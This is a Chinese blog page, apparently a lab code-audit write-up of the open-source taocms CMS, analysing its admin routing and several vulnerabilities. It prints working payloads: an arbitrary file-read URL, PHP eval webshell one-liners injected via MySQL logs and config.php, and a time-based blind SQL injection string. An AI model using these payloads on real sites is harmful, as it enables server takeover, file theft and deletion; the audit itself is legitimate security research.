@@ -1,0 +1,864 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/2.png">
+  <link rel="icon" href="/img/2.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Yf3te">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="taocms代码审计1、环境准备taocms phpstudy8.1.1.3 apache2.4.39+mysql5.7.26+php5.6.9 2、环境搭建先创建一个database，create database taocms;  直接访问站点install.php，数据库类型选择mysql，构建数据库配置|127.0.0.1:3306|root|root|taocms  直接安装即可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php代审2--Taocms">
+<meta property="og:url" content="http://example.com/2025/01/21/php%E4%BB%A3%E5%AE%A12-Taocms/index.html">
+<meta property="og:site_name" content="Yf3te--枯木怯逢春...">
+<meta property="og:description" content="taocms代码审计1、环境准备taocms phpstudy8.1.1.3 apache2.4.39+mysql5.7.26+php5.6.9 2、环境搭建先创建一个database，create database taocms;  直接访问站点install.php，数据库类型选择mysql，构建数据库配置|127.0.0.1:3306|root|root|taocms  直接安装即可">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/9.jpg">
+<meta property="article:published_time" content="2025-01-21T05:52:44.000Z">
+<meta property="article:modified_time" content="2025-01-21T05:58:26.418Z">
+<meta property="article:author" content="Yf3te">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/9.jpg">
+  
+  
+  
+  <title>php代审2--Taocms - Yf3te--枯木怯逢春...</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"ground_glass":{"enable":true},"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nPsiBpqAh9nfJ5Dy1WuaF7QX-MdYXbMMI","app_key":"uHgPDZvMgamWIL1SjZs4NpY4","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Yf3_te的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/7.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="php代审2--Taocms"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-21 13:52" pubdate>
+          2025年1月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span>次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">php代审2--Taocms</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer"/>
+
+<h1 id="taocms代码审计"><a href="#taocms代码审计" class="headerlink" title="taocms代码审计"></a>taocms代码审计</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p><a target="_blank" rel="noopener" href="https://github.com/taogogo/taocms">taocms</a></p>
+<p>phpstudy8.1.1.3</p>
+<p>apache2.4.39+mysql5.7.26+php5.6.9</p>
+<h2 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h2><p>先创建一个database，<code>create database taocms;</code></p>
+<p><img src="https://s2.loli.net/2025/01/21/MV3ZLy7jJxPQovT.png" srcset="/img/loading.gif" lazyload alt="image-20250120100949653"></p>
+<p>直接访问站点install.php，数据库类型选择mysql，构建数据库配置<code>|127.0.0.1:3306|root|root|taocms</code></p>
+<p><img src="https://s2.loli.net/2025/01/21/2XHQLvj75S38IGg.png" srcset="/img/loading.gif" lazyload alt="image-20250120101306885"></p>
+<p>直接安装即可</p>
+<p><img src="https://s2.loli.net/2025/01/20/J3Fda7chOkLV6no.png" srcset="/img/loading.gif" lazyload alt="image-20250120101447066"></p>
+<p>登录，再设定一下网站地址即可</p>
+<p><img src="https://s2.loli.net/2025/01/21/2rzBoN17xIkTdwH.png" srcset="/img/loading.gif" lazyload alt="image-20250120101943314"></p>
+<h2 id="3、路由审计"><a href="#3、路由审计" class="headerlink" title="3、路由审计"></a>3、路由审计</h2><p>1、大概看一下目录结构</p>
+<p><img src="https://s2.loli.net/2025/01/21/cnrklUKjaeJPYOS.png" srcset="/img/loading.gif" lazyload alt="image-20250120111539425"></p>
+<p>主要涉及到以下目录</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span>  后台管理<br>data   数据，例如一些文章<br><span class="hljs-keyword">include</span> 配置文件、一部分类<br><span class="hljs-keyword">template</span>  图片文件<br>wap		存储评论<br></code></pre></td></tr></table></figure>
+
+<p>2、看看站点的url，并结合网站目录，分析路由</p>
+<p>单纯看该cms的后台管理，发现无论点击左栏的任意项目，url都是<code>http://taocms/admin/admin.php?action=frame&amp;ctrl=iframes</code>，这明显不太对，怎么可能一点都不改变，于是我直接尝试执行一个功能点，抓个包看看情况（代码功底比较差，还是集合功能点理解），以”sql执行”为例</p>
+<p><img src="https://s2.loli.net/2025/01/21/qLTn4cPeyB8YzRj.png" srcset="/img/loading.gif" lazyload alt="image-20250120115000255"></p>
+<p>执行语句，并抓包</p>
+<p><img src="https://s2.loli.net/2025/01/21/cXWZiT3qSuaost1.png" srcset="/img/loading.gif" lazyload alt="image-20250120115154712"></p>
+<p>关注一下post传入的参数</p>
+<p><img src="https://s2.loli.net/2025/01/21/gnHqjcovpmrtuZx.png" srcset="/img/loading.gif" lazyload alt="image-20250120115244722"></p>
+<p>目前查看ctrl有iframes、display值；action有frame、sql等值</p>
+<p>依次全局搜索一下值，找一下共同点</p>
+<p><img src="https://s2.loli.net/2025/01/21/LEGv48baUeXFMxm.png" srcset="/img/loading.gif" lazyload alt="image-20250120115751947"></p>
+<p><img src="https://s2.loli.net/2025/01/21/ig6dm5nl8ZhsCea.png" srcset="/img/loading.gif" lazyload alt="image-20250120115832558"></p>
+<p>发现ctrl参数都对应了一个方法</p>
+<p><img src="https://s2.loli.net/2025/01/20/SzV1QT8LPCAyegs.png" srcset="/img/loading.gif" lazyload alt="image-20250120115940358"></p>
+<p><img src="https://s2.loli.net/2025/01/21/kgSJCoOG896dNDp.png" srcset="/img/loading.gif" lazyload alt="image-20250120120001908"></p>
+<p>而action参数则是应该对应类名</p>
+<p>所以我们差不都就明白了路由，再后台管理界面，action对应了类名、ctrl对应类中的方法名，而每一个类都以文件名的形式，放在include&#x2F;model目录下</p>
+<p><img src="https://s2.loli.net/2025/01/20/Vti1k85cIdEhlrJ.png" srcset="/img/loading.gif" lazyload alt="image-20250120120346257"></p>
+<p>上述就是我们根据url和目录结构分析的，这个方法比较好理解，现在我们直接看路由与页面跳转相关的代码，保存在admin.php中</p>
+<p><img src="https://s2.loli.net/2025/01/21/zmlyn6PvFMO2YNs.png" srcset="/img/loading.gif" lazyload alt="image-20250121121017872"></p>
+<h2 id="4、漏洞审计"><a href="#4、漏洞审计" class="headerlink" title="4、漏洞审计"></a>4、漏洞审计</h2><h3 id="漏洞1：任意文件读取"><a href="#漏洞1：任意文件读取" class="headerlink" title="漏洞1：任意文件读取"></a>漏洞1：任意文件读取</h3><p>全局函数file_get_contents()，这个函数主要是获取文件内容，但是不能输出，所以我也要看是否有输出，于是选定了下面这个文件</p>
+<p><img src="https://s2.loli.net/2025/01/20/g1YGZmworOtAX6W.png" srcset="/img/loading.gif" lazyload alt="image-20250120132333814"></p>
+<p>我进一步查看，发现是在一个download函数里面</p>
+<p><img src="https://s2.loli.net/2025/01/20/nGdZYpISqUCgrXu.png" srcset="/img/loading.gif" lazyload alt="image-20250120132543313"></p>
+<p>看了看，读取的变量为realpath，跟随其变量</p>
+<p><img src="https://s2.loli.net/2025/01/20/j4UaR3fqduO1rcH.png" srcset="/img/loading.gif" lazyload alt="image-20250120132843487"></p>
+<p>该变量是在construct魔术方法中，我们只需要直接传入path变量，再在上述download方法中发现，对path使用pathinfo方法，对我们的文件路径没有做任何限制和过滤，同时SYS_ROOT为网站根目录</p>
+<p><img src="https://s2.loli.net/2025/01/20/CWr7UTbP1Q4pBjt.png" srcset="/img/loading.gif" lazyload alt="image-20250120134055715"></p>
+<p>所以我们只需要直接传入path参数，就可以实现任意文件读取了</p>
+<h3 id="漏洞1验证"><a href="#漏洞1验证" class="headerlink" title="漏洞1验证"></a>漏洞1验证</h3><p>创建一个test.txt文件用于验证</p>
+<p>构建payload：</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">http://taocms/<span class="hljs-literal">admin</span>/<span class="hljs-literal">admin</span>.php?action=<span class="hljs-keyword">file</span>&amp;ctrl=download&amp;path=test.txt<br></code></pre></td></tr></table></figure>
+
+<p>发现报错，refer error应该是要求refer请求头</p>
+<p><img src="https://s2.loli.net/2025/01/21/Mt6qdDi3FrPoUaz.png" srcset="/img/loading.gif" lazyload alt="image-20250120171204252"></p>
+<p>翻翻代码，发现要ReferHost(referer请求头)要和Host请求头一样，否则会发生跳转，所以我们直接添加referer请求头</p>
+<p><img src="https://s2.loli.net/2025/01/20/YUxHS7Vgnzma3ru.png" srcset="/img/loading.gif" lazyload alt="image-20250120171554430"></p>
+<p>成功读取</p>
+<p><img src="https://s2.loli.net/2025/01/20/aBLTdwUG5W7n8qM.png" srcset="/img/loading.gif" lazyload alt="image-20250120171925490"></p>
+<p>当然也可以读取配置文件等</p>
+<p><img src="https://s2.loli.net/2025/01/20/bFsxCZe35aU1uwz.png" srcset="/img/loading.gif" lazyload alt="image-20250120172113681"></p>
+<h3 id="漏洞2：任意文件上传getshell"><a href="#漏洞2：任意文件上传getshell" class="headerlink" title="漏洞2：任意文件上传getshell"></a>漏洞2：任意文件上传getshell</h3><p>我们全局检索<code>upload(</code>关键词</p>
+<p>发现一个upload函数，但是是采用白名单过滤的，就放弃了</p>
+<p><img src="https://s2.loli.net/2025/01/20/G7zTUBOt5yLkahe.png" srcset="/img/loading.gif" lazyload alt="image-20250120172815405"></p>
+<p>然后我们再检索一下move_uploaded_file函数</p>
+<p><img src="https://s2.loli.net/2025/01/20/9dfOkCB2HaDt1rL.png" srcset="/img/loading.gif" lazyload alt="image-20250120173055961"></p>
+<p>然后我们根据tmpfile变量，但是没有我们可以传参的地地方，索性直接下一个。找了一阵代码没有什么比较好的突破口，我们直接回归功能点，根据web界面的功能点，去查看相关文件上传操作，并回归代码。</p>
+<p><img src="https://s2.loli.net/2025/01/20/62nGdN14KpIsrfj.png" srcset="/img/loading.gif" lazyload alt="image-20250120194333465"></p>
+<p>很明显的文件管理，直接新建一个1.php文件，并抓包</p>
+<p><img src="https://s2.loli.net/2025/01/20/PvNTDtMI4FVyQ7h.png" srcset="/img/loading.gif" lazyload alt="image-20250120194628617"></p>
+<p>根据路由找到相关代码：file类中的create函数，fopenhan’shu</p>
+<p><img src="https://s2.loli.net/2025/01/20/vq2YHINfFXpLAZ3.png" srcset="/img/loading.gif" lazyload alt="image-20250120194800148"></p>
+<p>没有做任何过滤，直接上传成功，直接编辑，写入php代码</p>
+<p><img src="https://s2.loli.net/2025/01/20/8dMWJ659QIVzFGC.png" srcset="/img/loading.gif" lazyload alt="image-20250120194923419"></p>
+<p><img src="https://s2.loli.net/2025/01/21/uKyN3ClmI4BsWxA.png" srcset="/img/loading.gif" lazyload alt="image-20250120195018697"></p>
+<p>在网站根目录下，直接访问，成功getshell</p>
+<p><img src="https://s2.loli.net/2025/01/20/yuSmWvcKtXxEkBU.png" srcset="/img/loading.gif" lazyload alt="image-20250120195054948"></p>
+<h3 id="漏洞3：mysql日志写入getshell-失败"><a href="#漏洞3：mysql日志写入getshell-失败" class="headerlink" title="漏洞3：mysql日志写入getshell(失败)"></a>漏洞3：mysql日志写入getshell(失败)</h3><p>其实这个不怎么需要代码审计，我们直接黑盒思路，因为这个cms的后台管理确实也太明目张胆了，真的就纯纯根据功能点来进行审计。</p>
+<p>我们直接在”执行sql”处执行sql语句<code>select @@version;</code>，查看版本为5.7.26</p>
+<p><img src="https://s2.loli.net/2025/01/20/5gNXVxaEOpvLJCF.png" srcset="/img/loading.gif" lazyload alt="image-20250120195806357"></p>
+<p>mysql版本5.6.34之后secure_file_priv值，默认为NULL，无法进行文件写入。于是我们使用日志写入shell，我们先查看</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general%&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/01/20/LudfbjvRMB4rhUF.png" srcset="/img/loading.gif" lazyload alt="image-20250120204824564"></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set global general_log = &quot;ON&quot;;</span><br><span class="language-xml">set global general_log_file=&#x27;D:\phpstudy_pro\WWW\taocms\2.php&#x27;;</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br></code></pre></td></tr></table></figure>
+
+<p>原本以为万无一失，但是奈何此处不能执行多条sql语句，就失败了。</p>
+<h3 id="漏洞4：修改配置文件getshell"><a href="#漏洞4：修改配置文件getshell" class="headerlink" title="漏洞4：修改配置文件getshell"></a>漏洞4：修改配置文件getshell</h3><p>翻阅网站功能点，在<code>网站设置</code>栏，更新功能点有个数据库的配置，同时猜想，可能在这个功能点会把相关配置写入配置文件中，于是审计以下代码，有没有可乘之机</p>
+<p><img src="https://s2.loli.net/2025/01/20/r29zBpuTxhU85DL.png" srcset="/img/loading.gif" lazyload alt="image-20250120212525582"></p>
+<p>可见该函数会先判断是否config.php是否可写，然后先销毁POST变量，然后重新传入POST参数，进行重新配置，其中POST的内容会被safeword函数进行过滤，我们进一步跟进safeword函数。</p>
+<p><img src="https://s2.loli.net/2025/01/20/vKA94S6Q2INdRwC.png" srcset="/img/loading.gif" lazyload alt="image-20250120213006505"></p>
+<p>默认level&#x3D;8，然后就走默认的level，如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeword</span>(<span class="hljs-params"><span class="hljs-variable">$text</span>,<span class="hljs-variable">$level</span>=<span class="hljs-number">8</span></span>)</span>&#123;<br>				<span class="hljs-keyword">default</span>:<br>					<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ucfirst</span>(DB)==<span class="hljs-string">&#x27;Sqlite&#x27;</span>)&#123;<br>						<span class="hljs-variable">$safeword</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>,<span class="hljs-variable">$text</span>);<br>					&#125;<br>					<span class="hljs-keyword">else</span>&#123;<br>						<span class="hljs-variable">$safeword</span>=<span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">_addslashs</span>(<span class="hljs-variable">$text</span>);<br>					&#125;<br>					<span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>不是Sqlite，于是直接使用_addslashs()方法，进一步跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_addslashs</span>(<span class="hljs-params"><span class="hljs-variable">$text</span></span>)</span>&#123;<br>	<span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$text</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>addslashes函数主要对一些特殊符号（通过在字符串中的单引号、双引号、反斜杠和 NULL 字符前加上反斜杠）来转义这些字符,所以就是会对我们POST传入的参数，进行简单转义</p>
+<p><img src="https://s2.loli.net/2025/01/20/oByEckNMtew3ClQ.png" srcset="/img/loading.gif" lazyload alt="image-20250120213916163"></p>
+<p>然会会将我们传入的内容直接写入config.php中，我们就可尝试直接在config.php中写入一句话木马，构造payload尝试绕过</p>
+<p><img src="https://s2.loli.net/2025/01/20/7cQeEn89RFqVygt.png" srcset="/img/loading.gif" lazyload alt="image-20250120215353435">但是迫于addslashes函数，还是失败了</p>
+<p><img src="https://s2.loli.net/2025/01/20/8sXFMqWwha3IOUN.png" srcset="/img/loading.gif" lazyload alt="image-20250120215423909"></p>
+<p>但是我们可以通过上一个if判断（数据库为Sqlite）来写入，这样以来，只会有一个字符替换</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$safeword</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&#x27;&quot;</span>,<span class="hljs-variable">$text</span>);<br></code></pre></td></tr></table></figure>
+
+<p>于是我们重新构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">\&#x27;);@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_REQUEST</span>[cmd]);/*<br></code></pre></td></tr></table></figure>
+
+<p><strong>记得选择sqlite数据库！</strong></p>
+<p><img src="https://s2.loli.net/2025/01/21/aLXD3kERHbTIf6Y.png" srcset="/img/loading.gif" lazyload alt="image-20250121095400099"></p>
+<p>成功修改配置</p>
+<p><img src="https://s2.loli.net/2025/01/21/xKLc2XNehBwGRUz.png" srcset="/img/loading.gif" lazyload alt="image-20250121100240950"></p>
+<p>成功getshell</p>
+<p><img src="https://s2.loli.net/2025/01/21/aCMLeWo4JzRPI36.png" srcset="/img/loading.gif" lazyload alt="image-20250121100312616"></p>
+<p>还可以通过install.php，安装的时候也根据上面选择sqlite，然后再构建payload</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>|<span class="hljs-type">root</span>|<span class="hljs-type">root</span>|<span class="hljs-type">taocms</span>|<span class="hljs-type">&#x27;);eval</span>($_REQUEST[&#x27;cmd&#x27;]);//<br></code></pre></td></tr></table></figure>
+
+<p>即可再次写入config.php文件getshell</p>
+<h3 id="漏洞5：任意文件删除"><a href="#漏洞5：任意文件删除" class="headerlink" title="漏洞5：任意文件删除"></a>漏洞5：任意文件删除</h3><p>检索unlink(，检索到下述代码</p>
+<p><img src="https://s2.loli.net/2025/01/21/n3IHov6NFkWLiEV.png" srcset="/img/loading.gif" lazyload alt="image-20250121105539158"></p>
+<p>没有什么过滤，直接构造payload，开删</p>
+<p><img src="https://s2.loli.net/2025/01/21/VmRB2rgDWwbnYt3.png" srcset="/img/loading.gif" lazyload alt="image-20250121110045349"></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>整个cms还有很多sql注入</p>
+<p>其中一个为例，我们通过翻阅函数，发现一个delist函数，该函数没有对sql语句及其参数使用过滤</p>
+<p><img src="https://s2.loli.net/2025/01/21/3Qhg4AXxOMZi1dK.png" srcset="/img/loading.gif" lazyload alt="image-20250121120214437"></p>
+<p>然后向上查找，找到cms类中有del方法调用delist方法，但是根据原delist函数发现没有回显，所以要采用盲注等方法</p>
+<p><img src="https://s2.loli.net/2025/01/21/BJeZOsKWF5NnEo8.png" srcset="/img/loading.gif" lazyload alt="image-20250121120317739"></p>
+<p>此处id就是我们的注入点，那我们该如何传入这个参数？于是我们尝试追踪id参数，找到了Article类中的id变量，为什么会定位到Article类，因为Cms类其实是继承了Article类的（如下）</p>
+<p><img src="https://s2.loli.net/2025/01/21/NEgXDBLCz9oa5tq.png" srcset="/img/loading.gif" lazyload alt="image-20250121121709214"></p>
+<p>然后我们通过查看Article类中的属性、方法，发现创建该类时就会调用魔术方法，__construct，然后使id&#x3D;0，这难道就不能传参了？肯定不会止步于此</p>
+<p><img src="https://s2.loli.net/2025/01/21/Iy3zeWsponlFZVw.png" srcset="/img/loading.gif" lazyload alt="image-20250121121503959"></p>
+<p>回看之前admin.php中的路由与参数</p>
+<p><img src="https://s2.loli.net/2025/01/21/cwx14Cu9KLUDEd7.png" srcset="/img/loading.gif" lazyload alt="image-20250121122335863"></p>
+<p>我们创建类的时候，是可以自己通过传参传入id参数的，从而突破了魔术方法的限制。而且PHP 中的子类可以使用父类的传参来创建子类对象。于是乎我们直接开始构造poc</p>
+<p>可以加一个echo查看调试语句</p>
+<p><img src="https://s2.loli.net/2025/01/21/SAxyrg9bkPRY5OU.png" srcset="/img/loading.gif" lazyload alt="image-20250121132622711"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">action</span>=cms&amp;ctrl=del&amp;id=27) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1# <br></code></pre></td></tr></table></figure>
+
+<p>没有成功</p>
+<p>尝试时间盲注，时间盲注poc如下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">action</span>=cms&amp;ctrl=del&amp;id=<span class="hljs-number">21</span>)+or+sleep(<span class="hljs-number">4</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/01/21/Hpa2SdJFQyRUkWG.png" srcset="/img/loading.gif" lazyload alt="image-20250121131901022"></p>
+<p>成功了！</p>
+<p>当然里面还有很多未做好过滤的，需要检索sql语句关键字，耐心查看</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个cms表面易挖掘的漏洞点，可以通过功能点很快挖掘到。</p>
